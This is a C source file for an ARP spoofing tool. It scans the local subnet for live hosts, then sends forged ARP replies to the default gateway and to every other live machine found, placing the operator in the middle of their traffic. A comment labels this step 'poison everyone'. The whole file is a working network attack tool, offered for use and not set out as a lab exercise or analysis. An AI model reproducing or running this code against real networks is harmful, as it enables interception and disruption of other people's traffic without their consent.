#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pcap.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>


#define FAIL     -1
#define ARPSIZ   42 
#define IPSLEN   20
#define IP_ALEN  4
#define MACSLEN  25
#define TCPBUFZ  68880
#define NPACKS   20
#define SDELAY   500
#define STIMEOUT 7 


void clean_exit(int e_no);
void print_usage(char *pname);
void sigintHandler(int sig_num);
void mac_to_str(char *mac_str, unsigned char mac[ETH_ALEN]);
void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base);
void ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN],
                                    unsigned char s_mac[ETH_ALEN], 
                                    unsigned char up_ips[255][ETH_ALEN]);
int is_valid_ip(char *ipAddress);
int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[4]);
int get_if_info(int sock, char dev[IFNAMSIZ], 
                          struct ifreq *ifreq_i,
                          struct ifreq *ifreq_c,
                          struct ifreq *ifreq_ip);
int send_arp(int sock, int if_idx, unsigned char *s_mac, 
                                   unsigned char *d_mac, 
                                   unsigned char *arp_s_mac, 
                                   unsigned char *arp_t_mac, 
                                   uint8_t arp_s_ip[4], 
                                   uint8_t arp_t_ip[4], 
                                   unsigned short int opcode);


uint8_t broadcast[] = "\xff\xff\xff\xff\xff\xff";
uint8_t empty[]     = "\x00\x00\x00\x00\x00\x00";
int sock_no;
unsigned char *bp;


int main(int argc, char *argv[]) {
    char dev[IFNAMSIZ];
    char LAN_ip[IPSLEN-4];
    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];
    char our_ip_str[IPSLEN], host_str[IPSLEN]; 
    unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
    struct ifreq ifreq_i, ifreq_c, ifreq_ip;
    uint8_t our_ip[4], host_ip[4], target_ip[4];
    int sock;

    unsigned char *recv_buf                  = calloc(ARPSIZ, sizeof(unsigned char *));
    unsigned char up_ips_macs[255][ETH_ALEN] = {0};

    // create raw socket
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        if (getuid() != 0) {
            printf("Run again as sudo! (sudo ./arp_spoof)\n");
            clean_exit(0);
        }
        printf("Error : raw sock create failed\n");
        bp = recv_buf;
        clean_exit(1);
    }

    // pass socket number and buffer to globals for clean clean_exit
    sock_no = sock;
    bp      = recv_buf;
    signal(SIGINT, sigintHandler);

    // get inferface from argument or pcap
    int dev_from_arg = 0;
    for (int i = 0; i < argc-1; i++) {
        if (strcmp(argv[i], "-i") == 0) {
            dev_from_arg = i+1;
            break;
        }
    }
    if (dev_from_arg) {
        int len = strlen(argv[dev_from_arg]);

        if (len > IFNAMSIZ) {
            printf("Interface name %s too long (try renaming it)\n", argv[dev_from_arg]);
            clean_exit(1);
        }
        strncpy(dev, argv[dev_from_arg], IFNAMSIZ);
        dev[len] = 0;
    }
    else {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_if_t *devs;

        // get default interface
        if (pcap_findalldevs(&devs, errbuf) == FAIL) {
            fprintf(stderr, "Error : could not default interface, please enter one %s\n", errbuf);
            clean_exit(1);
        }
        if (devs == NULL) {
            fprintf(stderr, "Error : could not default interface, please enter one\n");
            clean_exit(1);
        }
        int len = strlen(devs->name);

        if (len > IFNAMSIZ) {
            printf("Default interface name %s too long (try renaming it)\n", devs->name);
            clean_exit(1);
        }
        strncpy(dev, devs->name, IFNAMSIZ);
        dev[len] = 0;
    }


    // get interface info
    if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
        printf("Failed to get info for interface %s (you probably chose the worng one, try ifconfig or google)\n", dev);
        clean_exit(3);
    }

    // print/save interface info 
    memcpy(our_mac, (unsigned char *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
    mac_to_str(our_m_str, our_mac); 
    strncpy(our_ip_str, inet_ntoa((((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr)), IPSLEN);
    parse_bytes(our_ip_str, '.', our_ip, 4, 10);

    // parse IP LAN
    int last_dot = (strrchr(our_ip_str, '.')-our_ip_str);
    strncpy(LAN_ip, our_ip_str, last_dot);
    LAN_ip[last_dot] = 0;

    // set defaults
    int num_packets = NPACKS;
    int sufix       = 1;

    // get optional arguments
    int op = 0;
    while ((op = getopt(argc, argv, "h:n:i:")) != FAIL) {
        switch (op) {

            case 'i':
                // ignore interface option
                break;

            case 'h':
                // host sufix option
                if ((sufix = atoi(optarg)) > 254) {
                        printf("host sufix %d to high (over 254)\n", sufix);
                        clean_exit(1);
                }
                break;

            case 'n':
                // num-packets option
                num_packets = atoi(optarg);
                break;

            default:
                print_usage(argv[0]);
                clean_exit(1);
                break;
        }
    }

    // pass host IP
    sprintf(host_str, "%s.%d", LAN_ip, sufix);

    if (!is_valid_ip(host_str)) {
        printf("Error %s is not a vaild ip address\n", host_str);
        clean_exit(6);
    }
    host_ip[3] = sufix;

    // scan network for targets 
    ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac, up_ips_macs);

    // save host mac
    memcpy(host_mac, up_ips_macs[sufix], ETH_ALEN);
    mac_to_str(host_m_str, host_mac);

    // set first 3 IP fields for target
    target_ip[0] = our_ip[0];
    target_ip[1] = our_ip[1];
    target_ip[2] = our_ip[2];

    // poison everyone
    int h = 0;
    for (int i = 2; i < 255; i++) {
        if (i != sufix && memcmp(up_ips_macs[i], empty, ETH_ALEN)) {
            target_ip[3] = i;

            memcpy(target_mac, up_ips_macs[i], ETH_ALEN);
            mac_to_str(target_m_str, target_mac);

            printf("\nTarget %d: %s.%d\n\n", ++h, LAN_ip, i);

            // poison host
            printf("Poisoning host %s...\n", host_str);
            int p = num_packets;
            while (p--) {
                send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                        host_mac, 
                        our_mac, 
                        host_mac, 
                        target_ip, 
                        host_ip,
                        ARPOP_REPLY);

                sleep(1);
                printf("H:(%s) ---> U:(%s) ---> T:(%s)\n", host_m_str, our_m_str, target_m_str);
            }

            // poison target 
            printf("Poisoning target %s.%d...\n", LAN_ip, i);
            p = num_packets;
            while (p--) {
                send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                        target_mac,
                        our_mac,
                        target_mac,
                        host_ip,
                        target_ip,
                        ARPOP_REPLY);

                sleep(1);
                printf("H:(%s) <--- U:(%s) <--- T:(%s)\n", target_m_str, our_m_str, host_m_str);
            }
        }
    }
    clean_exit(0);
}

void print_usage(char *pname) {
    printf("Usage: (sudo) %s [interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
}

int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[IP_ALEN]) {
    int bytes_recvd;

    while (1) {
        bytes_recvd = read(sock, buf, ARPSIZ);

        if (ntohs(((struct ethhdr*)(buf))->h_proto) == 0x0806) {
            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr ));

            if (ntohs(arp->ea_hdr.ar_op) == op_code && memcmp(arp->arp_spa, s_ip, 4) == 0) {
                return bytes_recvd;
            }
        }
    }
}

void ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN], 
                                    unsigned char s_mac[ETH_ALEN],  
                                    unsigned char up_ips[255][ETH_ALEN]) {
    uint8_t t_ip[IP_ALEN];

    memcpy(t_ip, s_ip, IP_ALEN);
    
    // spam ARP requests
    printf("sweep scan ...\n");

    int i = 255;
    while (i--) {
        t_ip[3] = i;
        send_arp(sock, if_idx, s_mac,
                broadcast,
                s_mac,
                empty,
                s_ip,
                t_ip,
                ARPOP_REQUEST);
        usleep(SDELAY);
    }

    // wait STIMEOUT for ARP relpies
    time_t endwait;
    time_t start   = time(NULL);
    time_t seconds = STIMEOUT;
    unsigned char *buf = calloc(ARPSIZ, sizeof(unsigned char));

    endwait = start + seconds;

    int n_h = 0;
    while (start < endwait) {
        printf("%d seconds left...\r", (int)(endwait - start));
        fflush(stdout);

        if ((read(sock, buf, ARPSIZ)) < 0) {
            printf("Error : sock read failed\n");
            clean_exit(5);
        }

        if (ntohs(((struct ethhdr*)(buf))->h_proto) == 0x0806) {
            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr));

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) {
                memcpy(up_ips[arp->arp_spa[3]], arp->arp_sha, ETH_ALEN);
                
                printf("IP %d.%d.%.d.%-3d is up: %d up\n", t_ip[0], 
                                                           t_ip[1], 
                                                           t_ip[2], 
                                                           arp->arp_spa[3], 
                                                           ++n_h);
            }
        }
        start = time(NULL);
    }
    printf("\n%d targets up (ignoring host)\n", n_h);
}

void clean_exit(int e_no) {
    printf("Cleaning up...\n");
    close(sock_no);
    free(bp);
    exit(e_no);
}

void sigintHandler(int sig_num) {
    signal(SIGINT, sigintHandler);
    clean_exit(0);
}

void mac_to_str(char mac_str[MACSLEN], unsigned char mac[ETH_ALEN]) {
    snprintf(mac_str, MACSLEN, "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X", 
                                               mac[0],
                                               mac[1],
                                               mac[2],
                                               mac[3],
                                               mac[4],
                                               mac[5]);
}

void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base) {
    for (int i = 0; i < maxBytes; i++) {
        bytes[i] = strtoul(str, NULL, base);
        str      = strchr(str, sep);

        if (str == NULL || *str == '\0') {
            break;
        }
        str++;
    }
}

int get_if_info(int sock, char dev[IFNAMSIZ], 
                struct ifreq *ifreq_i,
                struct ifreq *ifreq_c,
                struct ifreq *ifreq_ip) {

    // get index number 
    memset(ifreq_i, 0, sizeof(struct ifreq));
    strncpy(ifreq_i->ifr_name, dev, IFNAMSIZ-1);
   
    if ((ioctl(sock, SIOCGIFINDEX, ifreq_i)) == FAIL) {
        printf("Error : %s ioctl index read failed\n", dev);
        return FAIL;
    }

    // get MAC Address
    memset(ifreq_c, 0, sizeof(struct ifreq));
    strncpy(ifreq_c->ifr_name, dev, IFNAMSIZ-1);

    if ((ioctl(sock, SIOCGIFHWADDR, ifreq_c)) == FAIL) {
        printf("Error : ioctl MAC read failed\n");
        return FAIL;
    }

    //get IP Address
    memset(ifreq_ip, 0, sizeof(struct ifreq));
    strncpy(ifreq_ip->ifr_name, dev, IFNAMSIZ-1);

    if(ioctl(sock, SIOCGIFADDR, ifreq_ip) == FAIL) {
        printf("Error : ioctl IP read failed\n");
        return FAIL;
    }
    return 0;
}

int is_valid_ip(char *ipAddress) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return result > 0;
}

int send_arp(int sock, int if_idx, unsigned char *s_mac, 
                                   unsigned char *d_mac, 
                                   unsigned char *arp_s_mac, 
                                   unsigned char *arp_t_mac, 
                                   uint8_t arp_s_ip[4], 
                                   uint8_t arp_t_ip[4], 
                                   unsigned short int opcode) {
    int send_len;
    unsigned char *sendbuff = calloc(ARPSIZ, sizeof(unsigned char *));

    // cast packet start to ethernet header
    struct ethhdr *eth = (struct ethhdr *)(sendbuff);

    // add interface/dest MAC and protocol
    memcpy(eth->h_source, s_mac, ETH_ALEN);
    memcpy(eth->h_dest, d_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_ARP);

    // cast next section to ARP header 
    struct ether_arp *arp = (struct ether_arp *)(sendbuff + sizeof(struct ether_header));
     
    // add ARP source/dest MAC
    memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
    memcpy(arp->arp_tha, arp_t_mac, ETH_ALEN);
    
    // add ARP source/dest IP
    memcpy(arp->arp_spa, arp_s_ip, 4);
    memcpy(arp->arp_tpa, arp_t_ip, 4);

    // set hardware type, protocol and opcode
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(2048);
    arp->ea_hdr.ar_op  = htons(opcode);
    
    // number of bytes in MAC/IP addresses
    arp->ea_hdr.ar_hln = ETH_ALEN;   
    arp->ea_hdr.ar_pln = 4;

    struct sockaddr_ll sadr_ll;
    sadr_ll.sll_ifindex = if_idx;
    sadr_ll.sll_halen   = ETH_ALEN;
    memcpy(sadr_ll.sll_addr, d_mac, ETH_ALEN);

    // send
    if ((send_len = sendto(sock, sendbuff, ARPSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
        printf("Error : sending failed :(\n");
        return FAIL;
    }
    return 0;
}


